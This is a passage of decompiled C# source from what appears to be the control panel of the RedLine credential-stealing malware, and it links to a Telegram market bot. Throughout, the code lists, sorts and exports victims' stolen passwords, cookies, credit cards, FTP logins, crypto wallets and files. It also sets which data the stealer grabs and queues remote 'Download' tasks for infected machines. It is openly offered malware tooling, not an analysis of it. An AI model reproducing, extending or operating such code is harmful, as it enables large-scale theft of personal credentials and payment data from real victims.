					MessageBox.Show(this, "Browsers not found");
				}
				user = default(UserLog);
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.ToString());
			}
		});
	}

	private void topHeader_Paint(object sender, object e)
	{
		int num = base.Width - 1;
		int num2 = base.Height - 1;
		Pen pen = new Pen(Color.Red, 3f);
		((PaintEventArgs)e).Graphics.DrawRectangle(pen, 0, 0, num, num2);
	}

	private void method_3(object sender, object e)
	{
	}

	private async void saveBtn_Click(object sender, object e)
	{
		string newSearch = ((AnimaTextBox)cc).Text;
		await Task.Factory.StartNew(delegate
		{
			try
			{
				FolderSelectDialog folderSelectDialog = new FolderSelectDialog
				{
					InitialDirectory = Directory.GetCurrentDirectory(),
					Title = "Choose directory to save logs"
				};
				if (folderSelectDialog.Show(base.Handle))
				{
					LazyLoader<UserLogsDb>.Instance.PageController.Pages[LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage].RaiseListChangedEvents = false;
					LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = false;
					new SaveProcessFrm(folderSelectDialog.FileName, newSearch).ShowDialog(this);
					LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = true;
					LazyLoader<UserLogsDb>.Instance.DbInstance.ResetBindings();
					LazyLoader<UserLogsDb>.Instance.PageController.UpdatePages(0, LazyLoader<UserLogsDb>.Instance.DbInstance);
					LazyLoader<UserLogsDb>.Instance.PageController.Pages[LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage].RaiseListChangedEvents = true;
					LazyLoader<UserLogsDb>.Instance.PageController.Pages[LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage].ResetBindings();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.ToString());
			}
		});
	}

	private async void saveToolStripMenuItem_Click(object sender, object e)
	{
		try
		{
			object obj = new _003C_003Ec__DisplayClass49_0();
			((_003C_003Ec__DisplayClass49_0)obj).folderBrowser = new FolderSelectDialog
			{
				InitialDirectory = Directory.GetCurrentDirectory(),
				Title = "Choose directory to save logs"
			};
			if (!((_003C_003Ec__DisplayClass49_0)obj).folderBrowser.Show(base.Handle) || ((DataGridView)logsListView).SelectedRows.Count <= 0)
			{
				return;
			}
			object enumerator = ((DataGridView)logsListView).SelectedRows.GetEnumerator();
			try
			{
				while (((IEnumerator)enumerator).MoveNext())
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)((IEnumerator)enumerator).Current;
					_003C_003Ec__DisplayClass49_0 _003C_003Ec__DisplayClass49_ = (_003C_003Ec__DisplayClass49_0)obj;
					int selectedItem = (int)dataGridViewRow.Cells[0].Value;
					await Task.Factory.StartNew(delegate
					{
						try
						{
							UserLog userLog = LazyLoader<UserLogsDb>.Instance.LoadBody(selectedItem);
							userLog.Checked = true;
							LazyLoader<UserLogsDb>.Instance.Save(userLog);
							List<string> domainDetects = ((RemoteClientSettings.DDPatterns == null) ? new List<string>() : RemoteClientSettings.DDPatterns.Cast<string>().ToList());
							userLog.SaveTo(_003C_003Ec__DisplayClass49_.folderBrowser.FileName, RemoteClientSettings.SaveAsJSON, domainDetects);
							userLog.Credentials = new Credentials();
							userLog.Screenshot = new byte[0];
							int index = LazyLoader<UserLogsDb>.Instance.FindIndex((UserLog x) => x.ID == userLog.ID);
							LazyLoader<UserLogsDb>.Instance.DbInstance[index] = userLog;
							LazyLoader<UserLogsDb>.Instance.PageController.UpdateByIndex(index, userLog);
							userLog = default(UserLog);
						}
						catch (Exception ex2)
						{
							System.IO.File.AppendAllText("saveLogs.txt", string.Concat("Save main error: ", ex2, Environment.NewLine));
						}
					});
				}
			}
			finally
			{
				if (enumerator is IDisposable disposable)
				{
					disposable.Dispose();
				}
			}
			MessageBox.Show(this, "Successfully saved");
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}

	private async void setCommentBtn_Click(object sender, object e)
	{
		try
		{
			if (((DataGridView)logsListView).SelectedRows.Count > 0)
			{
				object obj = new _003C_003Ec__DisplayClass50_0();
				((_003C_003Ec__DisplayClass50_0)obj)._003C_003E4__this = this;
				((_003C_003Ec__DisplayClass50_0)obj).comment = ((AnimaTextBox)commentTb).Text;
				List<int> list = new List<int>();
				List<int> list2 = new List<int>();
				foreach (DataGridViewRow selectedRow in ((DataGridView)logsListView).SelectedRows)
				{
					list2.Add(selectedRow.Index);
					list.Add((int)selectedRow.Cells[0].Value);
				}
				foreach (int item in list2)
				{
					try
					{
						if (!string.IsNullOrWhiteSpace((string)object_6))
						{
							UserLog value = ((Collection<UserLog>)object_5)[item];
							value.Comment = ((_003C_003Ec__DisplayClass50_0)obj).comment;
							((Collection<UserLog>)object_5)[item] = value;
						}
					}
					catch (Exception)
					{
					}
				}
				using List<int>.Enumerator enumerator3 = list.GetEnumerator();
				while (enumerator3.MoveNext())
				{
					_003C_003Ec__DisplayClass50_1 _003C_003Ec__DisplayClass50_ = new _003C_003Ec__DisplayClass50_1();
					_003C_003Ec__DisplayClass50_.CS_0024_003C_003E8__locals1 = (_003C_003Ec__DisplayClass50_0)obj;
					_003C_003Ec__DisplayClass50_.selectedItem = enumerator3.Current;
					object CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass50_2();
					((_003C_003Ec__DisplayClass50_2)CS_0024_003C_003E8__locals0).CS_0024_003C_003E8__locals2 = _003C_003Ec__DisplayClass50_;
					((_003C_003Ec__DisplayClass50_2)CS_0024_003C_003E8__locals0).userLog = default(UserLog);
					await Task.Factory.StartNew(delegate
					{
						try
						{
							((_003C_003Ec__DisplayClass50_2)CS_0024_003C_003E8__locals0).userLog = LazyLoader<UserLogsDb>.Instance.LoadBody(((_003C_003Ec__DisplayClass50_2)CS_0024_003C_003E8__locals0).CS_0024_003C_003E8__locals2.selectedItem);
							((_003C_003Ec__DisplayClass50_2)CS_0024_003C_003E8__locals0).userLog.Comment = ((_003C_003Ec__DisplayClass50_2)CS_0024_003C_003E8__locals0).CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1.comment;
							LazyLoader<UserLogsDb>.Instance.Save(((_003C_003Ec__DisplayClass50_2)CS_0024_003C_003E8__locals0).userLog);
						}
						catch (Exception ex3)
						{
							MessageBox.Show(((_003C_003Ec__DisplayClass50_2)CS_0024_003C_003E8__locals0).CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1._003C_003E4__this, "Error item: " + ex3.ToString());
						}
					});
					int index = LazyLoader<UserLogsDb>.Instance.FindIndex((UserLog x) => x.ID == ((_003C_003Ec__DisplayClass50_2)CS_0024_003C_003E8__locals0).CS_0024_003C_003E8__locals2.selectedItem);
					LazyLoader<UserLogsDb>.Instance.PageController.UpdateByIndex(index, ((_003C_003Ec__DisplayClass50_2)CS_0024_003C_003E8__locals0).userLog);
					LazyLoader<UserLogsDb>.Instance.DbInstance[index] = ((_003C_003Ec__DisplayClass50_2)CS_0024_003C_003E8__locals0).userLog;
					((_003C_003Ec__DisplayClass50_2)CS_0024_003C_003E8__locals0).userLog = default(UserLog);
				}
			}
			else
			{
				MessageBox.Show(this, "Select logs to set comment");
			}
		}
		catch (Exception ex2)
		{
			MessageBox.Show(this, "Error: " + ex2.ToString());
		}
	}

	private void method_4(object sender, object e)
	{
	}

	private async void systemInfoToolStripMenuItem_Click(object sender, object e)
	{
		int selectedItem = (int)((DataGridView)logsListView).SelectedRows[0].Cells[0].Value;
		await Task.Factory.StartNew(delegate
		{
			try
			{
				new SystemInfoFrm(LazyLoader<UserLogsDb>.Instance.LoadBody(selectedItem)).ShowDialog(this);
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.ToString());
			}
		});
	}

	private async void autofillsToolStripMenuItem_Click(object sender, object e)
	{
		int selectedItem = (int)((DataGridView)logsListView).SelectedRows[0].Cells[0].Value;
		await Task.Factory.StartNew(delegate
		{
			try
			{
				UserLog user = LazyLoader<UserLogsDb>.Instance.LoadBody(selectedItem);
				IList<Browser> browsers = user.Credentials.Browsers;
				if (browsers != null && browsers.Any())
				{
					new ChooseBrowserFrm(user, ViewerType.Autofills).ShowDialog(this);
				}
				else
				{
					MessageBox.Show(this, "Browsers not found");
				}
				user = default(UserLog);
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.ToString());
			}
		});
	}

	private async void creditCardsToolStripMenuItem_Click(object sender, object e)
	{
		int selectedItem = (int)((DataGridView)logsListView).SelectedRows[0].Cells[0].Value;
		await Task.Factory.StartNew(delegate
		{
			try
			{
				UserLog user = LazyLoader<UserLogsDb>.Instance.LoadBody(selectedItem);
				IList<Browser> browsers = user.Credentials.Browsers;
				if (browsers != null && browsers.Any())
				{
					new ChooseBrowserFrm(user, ViewerType.CreditCards).ShowDialog(this);
				}
				else
				{
					MessageBox.Show(this, "Browsers not found");
				}
				user = default(UserLog);
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.ToString());
			}
		});
	}

	private async void addTaskBtn_Click(object sender, object e)
	{
		string value = ((Control)newTaskAction).Text;
		string target = ((AnimaTextBox)newTaskTarget).Text;
		string finalPoint = ((AnimaTextBox)newTaskFinal).Text;
		string filter = ((AnimaTextBox)newTaskFilter).Text;
		string domainsCheck = ((AnimaTextBox)c2).Text;
		if (string.IsNullOrWhiteSpace(value))
		{
			MessageBox.Show(this, "Please enter an action to create new task");
		}
		else if (!string.IsNullOrWhiteSpace(target))
		{
			if (!string.IsNullOrWhiteSpace(finalPoint))
			{
				if (Enum.TryParse<RemoteTaskAction>(value, out var parsedAction))
				{
					if (int.TryParse(finalPoint, out var _))
					{
						await Task.Factory.StartNew(delegate
						{
							try
							{
								RemoteTask newTask = new RemoteTask
								{
									Action = parsedAction,
									Current = 0,
									Filter = filter,
									FinalPoint = finalPoint,
									Status = RemoteTaskStatus.Active,
									Target = target,
									Visible = true,
									DomainsCheck = domainsCheck
								};
								lock (LazyLoader<TasksDb>.Instance.DataBaseLock)
								{
									newTask.ID = LazyLoader<TasksDb>.Instance.DbInstance.Count + 1;
								}
								LazyLoader<TasksDb>.Instance.Save(newTask);
								lock (LazyLoader<TasksDb>.Instance.DataBaseLock)
								{
									Invoke((MethodInvoker)delegate
									{
										LazyLoader<TasksDb>.Instance.DbInstance.Add(newTask);
										UpdateTasks();
									});
								}
								Invoke((MethodInvoker)delegate
								{
									((Control)newTaskAction).Text = "Download";
									((AnimaTextBox)newTaskTarget).Text = string.Empty;
									((AnimaTextBox)newTaskFinal).Text = string.Empty;
									((AnimaTextBox)newTaskFilter).Text = string.Empty;
									((AnimaTextBox)c2).Text = string.Empty;
								});
							}
							catch (Exception ex)
							{
								MessageBox.Show(this, "Error: " + ex.ToString());
							}
						});
					}
					else
					{
						MessageBox.Show(this, "Please enter a correct final point to create new task");
					}
				}
				else
				{
					MessageBox.Show(this, "Please enter a correct action to create new task");
				}
			}
			else
			{
				MessageBox.Show(this, "Please enter a final point to create new task");
			}
		}
		else
		{
			MessageBox.Show(this, "Please enter a target to create new task");
		}
	}

	private async void tasksDgv_RowStateChanged(object sender, object e)
	{
		if (((DataGridViewRowStateChangedEventArgs)e).StateChanged != DataGridViewElementStates.Selected || ((DataGridView)tasksDgv).SelectedRows.Count <= 0)
		{
			return;
		}
		int selectedItem = (int)((DataGridView)tasksDgv).SelectedRows[0].Cells[0].Value;
		await Task.Factory.StartNew(delegate
		{
			try
			{
				RemoteTask task = LazyLoader<TasksDb>.Instance.LoadBody(selectedItem);
				Invoke((MethodInvoker)delegate
				{
					((Control)editTaskAction).Text = task.Action.ToString();
					((AnimaTextBox)editTaskTarget).Text = task.Target;
					((AnimaTextBox)editTaskFinal).Text = task.FinalPoint;
					((AnimaTextBox)editTaskFilter).Text = task.Filter;
					((Control)currentTaskStatus).Text = task.Status.ToString();
					((MetroSetCheckBox)editTaskVisible).Checked = task.Visible;
					((AnimaTextBox)c0).Text = task.DomainsCheck;
				});
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.ToString());
			}
		});
	}

	private async void saveTaskBtn_Click(object sender, object e)
	{
		if (((DataGridView)tasksDgv).SelectedRows.Count <= 0)
		{
			return;
		}
		_003C_003Ec__DisplayClass57_0 _003C_003Ec__DisplayClass57_ = new _003C_003Ec__DisplayClass57_0();
		_003C_003Ec__DisplayClass57_._003C_003E4__this = this;
		string value = ((Control)editTaskAction).Text;
		_003C_003Ec__DisplayClass57_.target = ((AnimaTextBox)editTaskTarget).Text;
		_003C_003Ec__DisplayClass57_.finalPoint = ((AnimaTextBox)editTaskFinal).Text;
		_003C_003Ec__DisplayClass57_.filter = ((AnimaTextBox)editTaskFilter).Text;
		_003C_003Ec__DisplayClass57_.visible = ((MetroSetCheckBox)editTaskVisible).Checked;
		string value2 = ((Control)currentTaskStatus).Text;
		_003C_003Ec__DisplayClass57_.domainsCheck = ((AnimaTextBox)c0).Text;
		if (!string.IsNullOrWhiteSpace(value))
		{
			if (!string.IsNullOrWhiteSpace(_003C_003Ec__DisplayClass57_.target))
			{
				if (string.IsNullOrWhiteSpace(_003C_003Ec__DisplayClass57_.finalPoint))
				{
					MessageBox.Show(this, "Please enter a final point to edit task");
					return;
				}
				_003C_003Ec__DisplayClass57_1 _003C_003Ec__DisplayClass57_2 = new _003C_003Ec__DisplayClass57_1();
				_003C_003Ec__DisplayClass57_2.CS_0024_003C_003E8__locals1 = _003C_003Ec__DisplayClass57_;
				if (Enum.TryParse<RemoteTaskAction>(value, out _003C_003Ec__DisplayClass57_2.parsedAction))
				{
					if (!int.TryParse(_003C_003Ec__DisplayClass57_2.CS_0024_003C_003E8__locals1.finalPoint, out var _))
					{
						MessageBox.Show(this, "Please enter a correct final point to edit task");
						return;
					}
					_003C_003Ec__DisplayClass57_2 _003C_003Ec__DisplayClass57_3 = new _003C_003Ec__DisplayClass57_2();
					_003C_003Ec__DisplayClass57_3.CS_0024_003C_003E8__locals2 = _003C_003Ec__DisplayClass57_2;
					if (Enum.TryParse<RemoteTaskStatus>(value2, out _003C_003Ec__DisplayClass57_3.parsedStatus))
					{
						object CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass57_3();
						((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).CS_0024_003C_003E8__locals3 = _003C_003Ec__DisplayClass57_3;
						((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).selectedItem = (int)((DataGridView)tasksDgv).SelectedRows[0].Cells[0].Value;
						((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).task = default(RemoteTask);
						await Task.Factory.StartNew(delegate
						{
							try
							{
								((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).task = LazyLoader<TasksDb>.Instance.LoadBody(((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).selectedItem);
								((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).task.Action = ((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).CS_0024_003C_003E8__locals3.CS_0024_003C_003E8__locals2.parsedAction;
								((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).task.Filter = ((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).CS_0024_003C_003E8__locals3.CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1.filter;
								((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).task.FinalPoint = ((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).CS_0024_003C_003E8__locals3.CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1.finalPoint;
								((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).task.Status = ((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).CS_0024_003C_003E8__locals3.parsedStatus;
								((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).task.Target = ((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).CS_0024_003C_003E8__locals3.CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1.target;
								((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).task.Visible = ((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).CS_0024_003C_003E8__locals3.CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1.visible;
								((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).task.DomainsCheck = ((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).CS_0024_003C_003E8__locals3.CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1.domainsCheck;
								LazyLoader<TasksDb>.Instance.Save(((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).task);
							}
							catch (Exception ex)
							{
								MessageBox.Show(((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).CS_0024_003C_003E8__locals3.CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1._003C_003E4__this, "Error: " + ex.ToString());
							}
						});
						Invoke((MethodInvoker)delegate
						{
							LazyLoader<TasksDb>.Instance.DbInstance[LazyLoader<TasksDb>.Instance.FindIndex((RemoteTask x) => x.ID == ((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).task.ID)] = ((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).task;
							((_003C_003Ec__DisplayClass57_3)CS_0024_003C_003E8__locals0).CS_0024_003C_003E8__locals3.CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1._003C_003E4__this.UpdateTasks();
						});
					}
					else
					{
						MessageBox.Show(this, "Please enter a correct status to edit task");
					}
				}
				else
				{
					MessageBox.Show(this, "Please enter a correct action to edit task");
				}
			}
			else
			{
				MessageBox.Show(this, "Please enter a target to edit task");
			}
		}
		else
		{
			MessageBox.Show(this, "Please enter an action to edit task");
		}
	}

	public void UpdateTasks()
	{
		object obj = tasksDgv;
		IEnumerable<RemoteTask> enumerable = LazyLoader<TasksDb>.Instance.DbInstance.Where((RemoteTask x) => x.Visible);
		object obj2;
		if (enumerable == null)
		{
			obj2 = null;
		}
		else
		{
			obj2 = enumerable.ToList();
			if (obj2 != null)
			{
				goto IL_0049;
			}
		}
		obj2 = new List<RemoteTask>();
		goto IL_0049;
		IL_0049:
		((DataGridView)obj).DataSource = new BindingList<RemoteTask>((IList<RemoteTask>)obj2);
	}

	private async void updateTaskBtn_Click(object sender, object e)
	{
		await Task.Factory.StartNew(delegate
		{
			lock (LazyLoader<TasksDb>.Instance.DataBaseLock)
			{
				Invoke((MethodInvoker)delegate
				{
					UpdateTasks();
				});
			}
		});
	}

	private async void saveSettingsBtn_Click(object sender, object e)
	{
		bool grabBrowsers = ((MetroSetCheckBox)grabBrowsersCb).Checked;
		bool grabFtps = ((MetroSetCheckBox)grabFtpsCb).Checked;
		bool grabFiles = ((MetroSetCheckBox)grabFilesCb).Checked;
		bool grabImClients = ((MetroSetCheckBox)grabImClientsCb).Checked;
		bool antiDuplicate = ((MetroSetCheckBox)duplicateCb).Checked;
		bool grabWallets = ((MetroSetCheckBox)c9).Checked;
		bool blockEmptyLogs = ((MetroSetCheckBox)d0).Checked;
		bool jsonCookies = ((MetroSetCheckBox)e3).Checked;
		bool grabScreenshot = ((MetroSetCheckBox)screenshotCb).Checked;
		bool grabVPN = ((MetroSetCheckBox)vpnCb).Checked;
		bool grabTelegram = ((MetroSetCheckBox)telegramCb).Checked;
		bool grabSteam = ((MetroSetCheckBox)steamCb).Checked;
		bool grabDiscord = ((MetroSetCheckBox)discordCb).Checked;
		string autosaveDir = ((AnimaTextBox)autosaveDirTb).Text;
		IEnumerable<string> blacklistedBuilds = ((ListBox)blackListBuildsLb).Items.Cast<string>();
		IEnumerable<string> blackListedHWIDs = ((ListBox)blackListHWIDsLb).Items.Cast<string>();
		IEnumerable<string> blackListedCountries = ((ListBox)blackListLb).Items.Cast<string>();
		IEnumerable<string> blackListedIPS = ((ListBox)blackListIPsLb).Items.Cast<string>();
		IEnumerable<string> getFilesSettings = ((ListBox)getFilesSettingsLb).Items.Cast<string>();
		IEnumerable<string> domainsSettings = ((ListBox)domainDetectorLb).Items.Cast<string>();
		await Task.Factory.StartNew(delegate
		{
			try
			{
				lock (settingsLock)
				{
					RemoteClientSettings.BlackListedBuilds.Clear();
					RemoteClientSettings.BlacklistedHWID.Clear();
					RemoteClientSettings.BlacklistedCountry.Clear();
					RemoteClientSettings.BlackListedIPS.Clear();
					RemoteClientSettings.DDPatterns.Clear();
					RemoteClientSettings.GrabPaths.Clear();
					RemoteClientSettings.GrabDiscord = grabDiscord;
					RemoteClientSettings.GrabBrowsers = grabBrowsers;
					RemoteClientSettings.GrabFiles = grabFiles;
					RemoteClientSettings.GrabFTP = grabFtps;
					RemoteClientSettings.GrabImClients = grabImClients;
					RemoteClientSettings.AntiDuplicate = antiDuplicate;
					RemoteClientSettings.GrabWallets = grabWallets;
					RemoteClientSettings.BlockEmptyLogs = blockEmptyLogs;
					RemoteClientSettings.SaveAsJSON = jsonCookies;
					RemoteClientSettings.AutosaveDirectory = autosaveDir;
					RemoteClientSettings.GrabSteam = grabSteam;
					RemoteClientSettings.GrabTelegram = grabTelegram;
					RemoteClientSettings.GrabVPN = grabVPN;
					RemoteClientSettings.GrabScreenshot = grabScreenshot;
					if (blackListedHWIDs.Any())
					{
						foreach (string item in blackListedHWIDs)
						{
							RemoteClientSettings.BlacklistedHWID.Add(item);
						}
					}
					if (blacklistedBuilds.Any())
					{
						foreach (string item2 in blacklistedBuilds)
						{
							RemoteClientSettings.BlackListedBuilds.Add(item2);
						}
					}
					if (blackListedIPS.Any())
					{
						foreach (string item3 in blackListedIPS)
						{
							RemoteClientSettings.BlackListedIPS.Add(item3);
						}
					}
					if (blackListedCountries.Any())
					{
						foreach (string item4 in blackListedCountries)
						{
							RemoteClientSettings.BlacklistedCountry.Add(item4);
						}
					}
					if (getFilesSettings.Any())
					{
						foreach (string item5 in getFilesSettings)
						{
							RemoteClientSettings.GrabPaths.Add(item5);
						}
					}
					if (domainsSettings.Any())
					{
						foreach (string item6 in domainsSettings)
						{
							RemoteClientSettings.DDPatterns.Add(item6);
						}
					}
					RemoteClientSettings.SaveSettings();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.ToString());
			}
		});
		MessageBox.Show(this, "Successfully");
	}

	private void addBlackCountryBtn_Click(object sender, object e)
	{
		if (string.IsNullOrWhiteSpace(((AnimaTextBox)blackCountryTb).Text))
		{
			MessageBox.Show(this, "Please enter a country");
			return;
		}
		((ListBox)blackListLb).Items.Add(((AnimaTextBox)blackCountryTb).Text);
		((AnimaTextBox)blackCountryTb).Text = string.Empty;
	}

	private void addSearchPatternBtn_Click(object sender, object e)
	{
		if (string.IsNullOrWhiteSpace(((AnimaTextBox)searchPatternTb).Text))
		{
			MessageBox.Show(this, "Please enter a search pattern");
			return;
		}
		((ListBox)getFilesSettingsLb).Items.Add(((AnimaTextBox)searchPatternTb).Text);
		((AnimaTextBox)searchPatternTb).Text = string.Empty;
	}

	private void deleteToolStripMenuItem_Click(object sender, object e)
	{
		((ListBox)blackListLb).Items.RemoveAt(((ListControl)blackListLb).SelectedIndex);
	}

	private void blackListCms_2_Opening(object sender, object e)
	{
		((CancelEventArgs)e).Cancel = ((ListBox)blackListLb).SelectedItems.Count == 0;
	}

	private void blackListCms_3_Opening(object sender, object e)
	{
		((CancelEventArgs)e).Cancel = ((ListBox)getFilesSettingsLb).SelectedItems.Count == 0;
	}

	private void toolStripMenuItem1_Click(object sender, object e)
	{
		((ListBox)getFilesSettingsLb).Items.RemoveAt(((ListControl)getFilesSettingsLb).SelectedIndex);
	}

	private async void deleteAllBtn_Click(object sender, object e)
	{
		try
		{
			await Task.Factory.StartNew(delegate
			{
				LazyLoader<TasksDb>.Instance.ClearDb();
				lock (c)
				{
					CompletedTasks.Default.Completed = new StringCollection();
					CompletedTasks.Default.Save();
				}
				lock (LazyLoader<TasksDb>.Instance.DataBaseLock)
				{
					Invoke((MethodInvoker)delegate
					{
						UpdateTasks();
					});
				}
			});
			MessageBox.Show(this, "Successfully");
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.ToString());
		}
	}

	private async void fTPToolStripMenuItem_Click(object sender, object e)
	{
		int selectedItem = (int)((DataGridView)logsListView).SelectedRows[0].Cells[0].Value;
		await Task.Factory.StartNew(delegate
		{
			try
			{
				UserLog userLog = LazyLoader<UserLogsDb>.Instance.LoadBody(selectedItem);
				IList<LoginPair> ftpConnections = userLog.Credentials.FtpConnections;
				if (ftpConnections != null && ftpConnections.Count > 0)
				{
					new PassViewer(new BindingList<LoginPair>(userLog.Credentials.FtpConnections.ToList())).ShowDialog(this);
				}
				else
				{
					MessageBox.Show(this, "FTPs not found");
				}
				userLog = default(UserLog);
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.ToString());
			}
		});
	}

	private async void filesToolStripMenuItem_Click(object sender, object e)
	{
		int selectedItem = (int)((DataGridView)logsListView).SelectedRows[0].Cells[0].Value;
		await Task.Factory.StartNew(delegate
		{
			try
			{
				UserLog userLog = LazyLoader<UserLogsDb>.Instance.LoadBody(selectedItem);
				IList<RemoteFile> files = userLog.Credentials.Files;
				if (files != null && files.Count > 0)
				{
					new FilesViewer(new BindingList<RemoteFile>(userLog.Credentials.Files.ToList())).ShowDialog(this);
				}
				else
				{
					MessageBox.Show(this, "Files not found");
				}
				userLog = default(UserLog);
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.ToString());
			}
		});
	}

	private void telegramLinkBtn_Click(object sender, object e)
	{
		Process.Start("https://t.me/redline_market_bot");
	}

	private async void singleSort_Click(object sender, object e)
	{
		((MetroSetButton)saveDiscordTokensBtn).Enabled = false;
		((MetroSetButton)singleSort).Enabled = false;
		((MetroSetButton)removeEmptyLogsBtn).Enabled = false;
		((MetroSetButton)removeCheckedLogsBtn).Enabled = false;
		((MetroSetButton)saveFtpAccountsBtn).Enabled = false;
		SingleSearchParams singleSearch = new SingleSearchParams
		{
			SetComment = ((AnimaTextBox)e9).Text,
			SkipComment = ((AnimaTextBox)e7).Text,
			BuildID = ((AnimaTextBox)singleIdSortTb).Text,
			Comment = ((AnimaTextBox)singleCommentSortTb).Text,
			OS = ((AnimaTextBox)singleOsSortTb).Text,
			Country = ((AnimaTextBox)singleCountrySortTb).Text,
			ContainsAFs = ((MetroSetCheckBox)singleAfSortCb).Checked,
			ContainsCCs = ((MetroSetCheckBox)singleCCsSortCb).Checked,
			ContainsFiles = ((MetroSetCheckBox)singleFilesSortCb).Checked,
			ContainsFTPs = ((MetroSetCheckBox)singleFtpsSortCb).Checked,
			CookieDomain = ((AnimaTextBox)singleCookieSortTb).Text,
			PasswordDomain = ((AnimaTextBox)singlePasswordSortTb).Text,
			ContainsWallets = ((MetroSetCheckBox)c6).Checked,
			SkipCookies = ((MetroSetCheckBox)fa).Checked,
			SkipPasswords = ((MetroSetCheckBox)f8).Checked,
			RefreshDD = ((MetroSetCheckBox)singleRefreshDomainDetectSortCb).Checked,
			SkipChecked = ((MetroSetCheckBox)singleSkipCheckedSortCb).Checked,
			FilesToSearch = ((AnimaTextBox)fileNamesToSearchTb).Text,
			ContainsSteam = ((MetroSetCheckBox)steamFilesCb).Checked,
			ContainsTelegram = ((MetroSetCheckBox)findTgCb).Checked,
			PasswordsMoreThan = (int)((NumericUpDown)passMoreThan).Value,
			CookiesMoreThan = (int)((NumericUpDown)cookiesMoreThan).Value
		};
		singleSearch.LogFrom = ((DateTimePicker)logDateFromDTP).Value;
		singleSearch.LogTo = ((DateTimePicker)logDateToDTP).Value;
		await Task.Factory.StartNew(delegate
		{
			try
			{
				FolderSelectDialog folderSelectDialog = new FolderSelectDialog
				{
					InitialDirectory = Directory.GetCurrentDirectory(),
					Title = "Choose directory to save logs"
				};
				if (folderSelectDialog.Show(base.Handle))
				{
					LogSorter logSorter = new LogSorter(folderSelectDialog.FileName, singleSearch);
					logSorter.OnIndexChanged = (CurrentIndexChangedEventHandler)Delegate.Combine(logSorter.OnIndexChanged, (CurrentIndexChangedEventHandler)delegate(int index, int total)
					{
						if (base.InvokeRequired)
						{
							Invoke((MethodInvoker)delegate
							{
								((Control)singleStatusLbl).Text = $"{index} / {total}";
							});
						}
						else
						{
							((Control)singleStatusLbl).Text = $"{index} / {total}";
						}
					});
					int num = logSorter.Sort();
					Invoke((MethodInvoker)delegate
					{
						((Control)singleStatusLbl).Text = "Waiting";
					});
					if (num <= 0)
					{
						MessageBox.Show(this, "Success.");
					}
					else
					{
						MessageBox.Show(this, $"Success. Removed {num} empty logs.");
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.ToString());
			}
		});
		((MetroSetButton)singleSort).Enabled = true;
		((MetroSetButton)removeEmptyLogsBtn).Enabled = true;
		((MetroSetButton)removeCheckedLogsBtn).Enabled = true;
		((MetroSetButton)saveFtpAccountsBtn).Enabled = true;
		((MetroSetButton)saveDiscordTokensBtn).Enabled = true;
	}

	private async void sortDomain_Click(object sender, object e)
	{
		((MetroSetButton)sortDomain).Enabled = false;
		if (!string.IsNullOrWhiteSpace(((AnimaTextBox)domainsTb).Text))
		{
			string[] domains = ((AnimaTextBox)domainsTb).Text.Split(new string[1] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
			await Task.Factory.StartNew(delegate
			{
				try
				{
					FolderSelectDialog folderSelectDialog = new FolderSelectDialog
					{
						InitialDirectory = Directory.GetCurrentDirectory(),
						Title = "Choose directory to save logs"
					};
					if (folderSelectDialog.Show(base.Handle))
					{
						string[] array = domains;
